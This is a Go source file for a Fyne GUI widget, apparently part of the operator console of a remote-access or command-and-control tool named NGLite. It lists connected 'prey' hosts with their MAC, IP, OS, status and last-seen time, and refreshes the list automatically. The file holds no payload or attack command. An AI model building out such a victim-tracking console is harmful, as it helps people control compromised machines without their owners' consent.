package widgets

import (
	"NGLite/internal/core"
	"fmt"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

type SessionListWidget struct {
	widget.BaseWidget
	manager   *core.SessionManager
	list      *widget.List
	sessions  []*core.Session
	onSelect  func(*core.Session)
	container *fyne.Container
}

func NewSessionListWidget(mgr *core.SessionManager) *SessionListWidget {
	w := &SessionListWidget{
		manager:  mgr,
		sessions: []*core.Session{},
	}

	w.list = widget.NewList(
		func() int {
			return len(w.sessions)
		},
		func() fyne.CanvasObject {
			return container.NewVBox(
				widget.NewLabel("Template"),
			)
		},
		func(id widget.ListItemID, obj fyne.CanvasObject) {
			if id >= len(w.sessions) {
				return
			}
			session := w.sessions[id]
			box := obj.(*fyne.Container)
			label := box.Objects[0].(*widget.Label)
			label.SetText(w.formatSession(session))
		},
	)

	w.list.OnSelected = func(id widget.ListItemID) {
		if id >= len(w.sessions) || w.onSelect == nil {
			return
		}
		w.onSelect(w.sessions[id])
	}

	refreshBtn := widget.NewButton("刷新", func() {
		w.Refresh()
	})

	// 布局：底部固定刷新按钮，中间会话列表自适应
	w.container = container.NewBorder(
		nil,
		refreshBtn,
		nil,
		nil,
		w.list,
	)

	mgr.SetOnAdd(func(s *core.Session) {
		w.Refresh()
	})

	mgr.SetOnUpdate(func(s *core.Session) {
		w.Refresh()
	})

	go w.autoRefresh()

	w.ExtendBaseWidget(w)
	return w
}

func (w *SessionListWidget) formatSession(s *core.Session) string {
	elapsed := time.Since(s.LastSeen)
	lastSeenStr := ""
	if elapsed < time.Minute {
		lastSeenStr = fmt.Sprintf("%.0f秒前", elapsed.Seconds())
	} else if elapsed < time.Hour {
		lastSeenStr = fmt.Sprintf("%.0f分钟前", elapsed.Minutes())
	} else {
		lastSeenStr = fmt.Sprintf("%.1f小时前", elapsed.Hours())
	}

	return fmt.Sprintf("%s %s\nMAC: %s\nIP: %s\nOS: %s\n状态: %s | %s",
		getStatusIcon(s.Status),
		s.PreyID,
		s.MAC,
		s.IP,
		s.OS,
		s.Status.String(),
		lastSeenStr,
	)
}

func getStatusIcon(status core.SessionStatus) string {
	switch status {
	case core.StatusOnline:
		return "●"
	case core.StatusOffline:
		return "○"
	case core.StatusLost:
		return "◐"
	default:
		return "?"
	}
}

func (w *SessionListWidget) Refresh() {
	w.sessions = w.manager.GetAllSessions()
	if w.list != nil {
		w.list.Refresh()
	}
}

func (w *SessionListWidget) autoRefresh() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		w.Refresh()
		w.manager.CheckTimeout(5 * time.Minute)
	}
}

func (w *SessionListWidget) SetOnSelect(callback func(*core.Session)) {
	w.onSelect = callback
}

func (w *SessionListWidget) CreateRenderer() fyne.WidgetRenderer {
	return widget.NewSimpleRenderer(w.container)
}

